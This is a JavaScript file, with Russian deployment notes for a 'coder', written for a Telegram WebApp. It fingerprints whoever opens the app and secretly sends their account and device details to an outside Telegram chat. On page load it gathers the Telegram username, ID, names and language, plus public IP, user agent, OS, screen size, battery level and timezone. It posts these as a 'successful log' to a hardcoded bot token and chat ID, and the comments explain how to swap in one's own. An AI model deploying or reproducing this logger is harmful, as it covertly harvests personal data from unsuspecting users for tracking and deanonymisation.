// кодеру, который будет ставить это на хост:
// -   скрипт предназначен под Telegram WebApp, 
//     поэтому даже не пытайся под что либо адаптировать:
//     проще будет переписать по новой;
// 1-----------------------------------------------------
// -   имеестя проблема с getTimezoneOffset(),
//     ебись сам
// 2-----------------------------------------------------
// -   менять токен и ID чата прямо в фунцкии:
//     sendDataToTelegram() - 74-76 строки
// 3-----------------------------------------------------
// -   на iOS не работае функция ниже: getIPAdress()
//     в связи давним обновлением сафари
// 4-----------------------------------------------------
// -   может показывать не все устройства верно.
// ------------------------------------------------------
//                     УДАЧИ!
//                     УДАЧИ!
//                     УДАЧИ!


// async function getIPAddress() {
//     const response = await fetch('https://api.ipify.org?format=json');
//     const data = await response.json();
//     return data.ip;
// }

async function fetchPublicIP() {
    const ipServices = [
        'https://api.ipify.org?format=json',
        'https://api.ip.sb/ip',
        'https://api4.my-ip.io/ip.json',
        'https://ip.seeip.org/json'
    ];

    for (const service of ipServices) {
        try {
            const response = await fetch(service);
            const text = await response.text();
            
            // Handle different response formats
            try {
                // Try parsing as JSON first
                const data = JSON.parse(text);
                // Different APIs return IP in different fields
                const ip = data.ip || data.IP || data.address;
                if (ip) return ip;
            } catch {
                // If not JSON, might be plain text IP
                if (/^[0-9]{1,3}(\.[0-9]{1,3}){3}$/.test(text.trim())) {
                    return text.trim();
                }
            }
        } catch (error) {
            console.error(`Error fetching IP from ${service}:`, error);
            continue; // Try next service
        }
    }
    
    // If all services fail
    return 'Не удалось получить IP';
}

function getUserAgent() {
    return navigator.userAgent;
}

function getOSName() {
    return navigator.platform;
}

function getScreenResolution() {
    return `${window.screen.width}x${window.screen.height}`;
}

async function getBatteryPercentage() {
    const battery = await navigator.getBattery();
    return Math.floor(battery.level * 100);
}

function getBrowserInfo() {
    return {
        name: navigator.appName,
        version: navigator.appVersion,
        engine: navigator.product
    };
}

async function sendDataToTelegram() {
    try {
        // Check if Telegram WebApp is available
        if (!window.Telegram || !window.Telegram.WebApp) {
            throw new Error('Telegram WebApp не инициализирован');
        }

        let tg = window.Telegram.WebApp;

        // Wait for initialization if needed
        if (!tg.initDataUnsafe || !tg.initDataUnsafe.user) {
            // Wait for up to 3 seconds for initialization
            for (let i = 0; i < 30; i++) {
                await new Promise(resolve => setTimeout(resolve, 100));
                if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
                    break;
                }
            }
            
            // If still not initialized, throw error
            if (!tg.initDataUnsafe || !tg.initDataUnsafe.user) {
                throw new Error('Не удалось получить данные пользователя Telegram');
            }
        }

        const ipAddress = await fetchPublicIP();
        const userAgent = getUserAgent();
        const osName = getOSName();
        const screenResolution = getScreenResolution();
        let batteryPercentage;
        try {
            batteryPercentage = await getBatteryPercentage();
        } catch (error) {
            console.error('Error getting battery info:', error);
            batteryPercentage = 'Недоступно';
        }
        const browserInfo = getBrowserInfo();

        // Safe access to user data with fallbacks
        const user = tg.initDataUnsafe.user || {};
        const message = `
<b>✨ Лог успешен!</b>
<b>🔍 Информация об аккаунте:</b>
├ Тэг: @${user.username || 'Отсутствует'}
├ Айди: <code>${user.id || 'Неизвестно'}</code>
├ Имя: <code>${user.first_name || 'Неизвестно'}</code>
├ Фамилия: <code>${user.last_name || 'Отсутствует'}</code>
├ Язык: <code>${user.language_code || 'Неизвестно'}</code>
└ Можно писать в ЛС: <code>${user.allows_write_to_pm || 'Неизвестно'}</code>
<b>🖥 Информация об устройстве:</b>
├ Айпи: <code>${ipAddress}</code>
├ UserAgent: <code>${userAgent}</code>
├ Хэш: <code>undefined</code>
├ Имя ОС: <code>${osName}</code>
├ Разрешение экрана: <code>${screenResolution}</code>
├ Процент батареи: <code>${batteryPercentage}${typeof batteryPercentage === 'number' ? '%' : ''}</code>
└ Часовой пояс: <code>${new Date().getTimezoneOffset()}</code>
<b>🌐 Информация о браузере:</b>
├ Название браузера: <code>${browserInfo.name}</code>
├ Версия браузера: <code>${browserInfo.version}</code>
└ Тип движка браузера: <code>${browserInfo.engine}</code>
        `;

        const token = '7654890944:AAGaxUzyNxethxulDQKFSNkfciruDiIxDXc';
        const telegramBotURL = `https://api.telegram.org/bot${token}/sendMessage`;
        const chatId = '-4778017209';

        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('text', message);
        formData.append('parse_mode', 'HTML');

        const response = await fetch(telegramBotURL, {
            method: 'POST',
            body: formData
        });

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
    } catch (error) {
        console.error('Error in sendDataToTelegram:', error);
        
        // Send error report to Telegram
        try {
            const errorMessage = `
<b>⚠️ Ошибка в скрипте!</b>
<b>🔍 Детали ошибки:</b>
├ Сообщение: <code>${error.message}</code>
├ UserAgent: <code>${getUserAgent()}</code>
├ Платформа: <code>${getOSName()}</code>
└ Время: <code>${new Date().toISOString()}</code>
            `;

            const token = '7654890944:AAGaxUzyNxethxulDQKFSNkfciruDiIxDXc';
            const telegramBotURL = `https://api.telegram.org/bot${token}/sendMessage`;
            const chatId = '-4778017209';

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('text', errorMessage);
            formData.append('parse_mode', 'HTML');

            await fetch(telegramBotURL, {
                method: 'POST',
                body: formData
            });
        } catch (sendError) {
            console.error('Failed to send error report:', sendError);
        }
    }
}

// Wait for Telegram WebApp to be ready before running
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', sendDataToTelegram);
} else {
    sendDataToTelegram();
}
